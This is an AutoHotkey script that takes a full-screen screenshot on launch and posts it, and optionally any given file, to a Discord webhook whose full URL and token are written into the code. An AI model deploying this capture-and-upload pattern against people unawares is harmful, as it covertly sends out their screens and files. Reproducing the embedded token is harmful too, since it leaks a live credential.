#Requires AutoHotkey v2.0
#SingleInstance Force
#Include Gdip_All.ahk

SetWorkingDir A_ScriptDir

webhook := "https://discord.com/api/webhooks/1378173910763307078/L7445XqLIeTkaYs1o5LeEpOTfCRjNoU5KyZdvuS9zqVWriqhxFhEkhwCIQ9YcwMbvdPG"

CaptureAndSend()

sendToWebhook(message, ss := false, x := 0, y := 0, w := 0, h := 0) {
    pToken := Gdip_Startup()
    static http := ComObject("WinHttp.WinHttpRequest.5.1")

    if ss {
        pBitmap := (x = 0 && y = 0 && w = 0 && h = 0)  ? Gdip_BitmapFromScreen() : Gdip_BitmapFromScreen(x "|" y "|" w "|" h)
        Gdip_SaveBitmapToFile(pBitmap, A_Temp "\ss.png")
        Gdip_DisposeImage(pBitmap)

        data := CreateFormData(Map(
            "payload_json", '{ "content": "' . message . '"}',  ; Added missing comma and fixed string concatenation
            "file", "@" A_Temp "\ss.png"
        ))

        http.Open("POST", webhook, 1)
        http.SetRequestHeader("Content-Type", data.contentType)
        http.Send(data.body)

        FileDelete(A_Temp "\ss.png")
    } else {
        http.Open("POST", webhook, 1)
        http.SetRequestHeader("Content-Type", "application/json")
        http.Send('{ "content": "' . message . '" }')
    }
    Gdip_Shutdown(pToken)
}

CreateFormData(formData) {
    boundary := "boundary" Random(1000000, 9999999), buf := Buffer()

    for k, v in formData {
        if v ~= "^@" {
            file := FileOpen(LTrim(v, "@"), "r")
            AddStr "--" boundary '`r`nContent-Disposition: form-data; name="' k '"; filename="ss.png"`r`nContent-Type: image/png`r`n`r`n'
            AddFile(file), AddStr("`r`n")
        } else AddStr "--" boundary '`r`nContent-Disposition: form-data; name="' k '"`r`n`r`n' v "`r`n"
    }
    AddStr "--" boundary "--"

    return {body: SafeArrayFromBuffer(buf), contentType: "multipart/form-data; boundary=" boundary}

    AddStr(str) => (oldSize:=buf.Size, buf.Size+=strSize:=StrPut(str,"UTF-8")-1, StrPut(str,buf.Ptr+oldSize,strSize,"UTF-8"))
    AddFile(file) => (oldSize:=buf.Size, buf.Size+=file.Length, file.Pos:=0, file.RawRead(buf.ptr+oldSize,file.Length))
    SafeArrayFromBuffer(buf) => (arr:=ComObjArray(0x11,buf.Size), DllCall("RtlMoveMemory","Ptr",NumGet(ComObjValue(arr),8+A_PtrSize,"Ptr"),"Ptr",buf,"Ptr",buf.Size), arr)
}


UploadFileToWebhook(filePath) {
    global webhook

    ; Vérifie si le fichier existe avant d'essayer de l'envoyer
    if !FileExist(filePath) {
        SendToWebhook("Erreur : Le fichier " . filePath . " n'a pas été trouvé.")
        return
    }



    data := CreateFormData(Map(
        "file", "@" . filePath
    ))

    http := ComObject("WinHttp.WinHttpRequest.5.1")
    http.Open("POST", webhook, false)
    http.SetRequestHeader("Content-Type", data.contentType)
    http.Send(data.body)
}


CaptureAndSend(x := 0, y := 0, w := 1920, h := 1080) {
    sendToWebhook("", true, x, y, w, h)
}

^o:: {
    ExitApp
}
return
